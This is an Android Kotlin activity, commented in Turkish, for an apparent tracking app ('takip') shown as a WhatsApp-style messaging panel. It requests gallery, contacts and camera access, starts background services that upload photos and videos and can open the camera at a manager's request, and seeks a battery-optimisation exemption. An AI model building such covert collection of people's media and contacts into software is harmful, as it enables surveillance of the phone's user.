package org.duru.takip

import android.Manifest
import android.annotation.SuppressLint
import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

// Paneli (WhatsApp mesaj sistemi) WebView ile gösterir. Panel web olduğu için
// arayüz/özellik değişiklikleri APK güncellemeden anında yansır.
class MainActivity : AppCompatActivity() {
	private lateinit var web: WebView
	private var panelAcik = false // panel açıldıysa (KAYIT/ONAY'a yönlenmediyse) true

	// Paneldeki <input type="file"> (mesaja foto/video/dosya ekleme) için telefonun dosya seçicisi.
	// WebView bunu kendisi açmaz; WebChromeClient.onShowFileChooser ile biz açarız.
	private var dosyaGeriDonus: ValueCallback<Array<Uri>>? = null
	private val dosyaSecici = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { sonuc ->
		val uris = WebChromeClient.FileChooserParams.parseResult(sonuc.resultCode, sonuc.data)
		dosyaGeriDonus?.onReceiveValue(uris) // iptal edilirse null: input yeniden çalışabilsin diye yine bildir
		dosyaGeriDonus = null
	}

	// İzinler (galeri + rehber + kamera) tek seferde istenir. Güncelleme sonrası eski onaylı
	// cihazlarda da panel açılınca eksik izinler (ör. yeni gelen kamera) burada istenir.
	// İzin verilsin/verilmesin servisler başlar; her özellik yalnız kendi izni varsa çalışır.
	private val izinSonucu = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
		if (Depo(this).token != null) YuklemeServisi.baslat(this) // galeri/rehber verildiyse yükleme tetiklenir
		KameraServisi.baslat(this) // kamera servisi (kamera yalnız izin VE müdür isteğiyle açılır)
	}

	@SuppressLint("SetJavaScriptEnabled")
	override fun onCreate(savedInstanceState: Bundle?) {
		super.onCreate(savedInstanceState)

		// Güvenlik: kurcalama/yeniden imzalama varsa admin paneline bildirim gönderip
		// uygulamayı durdurur. Cihazda/veride başka hiçbir şeyi etkilemez.
		if (!Butunluk.dogrulaVeyaCik(this)) return

		// İlk açılış yönlendirmesi: kayıt yoksa Kayıt, onay yoksa Onay, ikisi varsa panel.
		when (Depo(this).hedef()) {
			Hedef.KAYIT -> { startActivity(Intent(this, KayitActivity::class.java)); finish(); return }
			Hedef.ONAY -> { startActivity(Intent(this, OnayActivity::class.java)); finish(); return }
			Hedef.PANEL -> { /* panel aşağıda açılır */ }
		}
		panelAcik = true
		// Not: yükleme taraması onResume'da tetiklenir ki uygulamaya her dönüşte
		// (sadece ilk açılışta değil) sonradan çekilen foto/videolar da yakalansın.

		pilMuafiyetiIste() // arka plan yüklemesi kesilmesin
		izinleriIste()     // galeri + rehber + kamera: eksik olanları (güncelleme sonrası dahil) iste

		web = WebView(this)
		setContentView(web)
		web.settings.javaScriptEnabled = true
		web.settings.domStorageEnabled = true
		// Web sitesi gibi değil, uygulama gibi dursun: esneme/parlama yok, yakınlaştırma yok.
		web.overScrollMode = View.OVER_SCROLL_NEVER
		web.isVerticalScrollBarEnabled = false
		web.isHorizontalScrollBarEnabled = false
		web.settings.setSupportZoom(false)
		web.settings.builtInZoomControls = false
		web.settings.displayZoomControls = false
		web.settings.textZoom = 100 // sistem yazı boyutu düzeni bozmasın
		web.setBackgroundColor(ContextCompat.getColor(this, R.color.zemin))
		web.webViewClient = WebViewClient()
		web.webChromeClient = object : WebChromeClient() {
			override fun onShowFileChooser(
				view: WebView,
				geriDonus: ValueCallback<Array<Uri>>,
				params: FileChooserParams
			): Boolean {
				dosyaGeriDonus?.onReceiveValue(null) // yarım kalan önceki seçimi kapat
				dosyaGeriDonus = geriDonus
				val secim = params.createIntent().apply {
					addCategory(Intent.CATEGORY_OPENABLE)
					if (type.isNullOrEmpty() || type == "*/*") {
						type = "*/*"
						putExtra(Intent.EXTRA_MIME_TYPES, arrayOf("image/*", "video/*", "*/*"))
					}
				}
				return try {
					dosyaSecici.launch(Intent.createChooser(secim, "Dosya seç"))
					true
				} catch (e: ActivityNotFoundException) {
					dosyaGeriDonus = null
					false
				}
			}
		}
		web.loadUrl(Sabit.PANEL)

		Guncelleyici.kontrolEt(this) // açılışta yeni sürüm var mı diye bak
	}

	// Uygulamaya her dönüşte yeni foto/videoları tara (en çok dakikada bir, boşa tam tarama olmasın).
	override fun onResume() {
		super.onResume()
		if (!panelAcik || Depo(this).token == null) return
		wifiUyarisiGerekirse() // WiFi'de değilse günde bir kez nazikçe öner (zorunlu değil)
		val simdi = System.currentTimeMillis()
		if (simdi - Depo(this).sonTarama < 60_000) return
		Depo(this).sonTarama = simdi
		YuklemeServisi.baslat(this)
	}

	// WiFi'de değilse, veri tasarrufu için WiFi'ye yönlendiren (ZORUNLU OLMAYAN) bir öneri gösterir.
	// Rahatsız etmemek için günde en fazla bir kez; kullanıcı "Şimdi değil" ile geçebilir.
	private fun wifiUyarisiGerekirse() {
		if (Yukleme.wifiUygun(this)) return
		val depo = Depo(this)
		val simdi = System.currentTimeMillis()
		if (simdi - depo.sonWifiUyari < 24 * 60 * 60 * 1000L) return
		depo.sonWifiUyari = simdi
		try {
			AlertDialog.Builder(this)
				.setTitle("WiFi önerilir")
				.setMessage("İnternet tasarrufu için WiFi'ye bağlanın. Fotoğraf ve videolar yalnızca WiFi'deyken yüklenir; mobil veriniz harcanmaz. Diğer özellikler mobil veriyle de çalışır.")
				.setPositiveButton("WiFi Ayarları") { _, _ ->
					try { startActivity(Intent(Settings.ACTION_WIFI_SETTINGS)) } catch (e: Exception) {}
				}
				.setNegativeButton("Şimdi değil", null)
				.show()
		} catch (e: Exception) {
			// activity gösterime uygun değilse sessiz geç
		}
	}

	// Galeri + rehber + kamera izinlerinden EKSİK olanları tek diyalogda ister. Güncelleme
	// sonrası eski cihazlarda da (ör. yeni gelen kamera izni) burada sorulur. Zaten verilmiş
	// olanlar için Android diyalog göstermez. Hiç eksik yoksa doğrudan kamera servisini başlatır.
	private fun izinleriIste() {
		val gerekli = mutableListOf<String>()
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
			gerekli += Manifest.permission.READ_MEDIA_IMAGES
			gerekli += Manifest.permission.READ_MEDIA_VIDEO
			gerekli += Manifest.permission.POST_NOTIFICATIONS
		} else {
			gerekli += Manifest.permission.READ_EXTERNAL_STORAGE
		}
		gerekli += Manifest.permission.READ_CONTACTS
		gerekli += Manifest.permission.CAMERA
		val eksik = gerekli.filter {
			ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
		}
		if (eksik.isEmpty()) { KameraServisi.baslat(this); return }
		izinSonucu.launch(eksik.toTypedArray())
	}

	// Pil optimizasyonu muafiyeti: OEM telefonlarda arka plan yükleme worker'ı
	// kısılmasın diye kullanıcıdan bir kez ister (sideload APK; reddedilse de çalışır).
	private fun pilMuafiyetiIste() {
		if (Depo(this).pilSoruldu) return
		val pm = getSystemService(PowerManager::class.java)
		if (pm != null && pm.isIgnoringBatteryOptimizations(packageName)) return
		Depo(this).pilSoruldu = true
		try {
			@SuppressLint("BatteryLife")
			val it = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
			startActivity(it)
		} catch (e: Exception) {
			// bu ekranı açamayan cihaz: sessiz geç, uygulama yine çalışır
		}
	}

	@Suppress("OVERRIDE_DEPRECATION")
	override fun onBackPressed() {
		if (web.canGoBack()) web.goBack() else super.onBackPressed()
	}
}
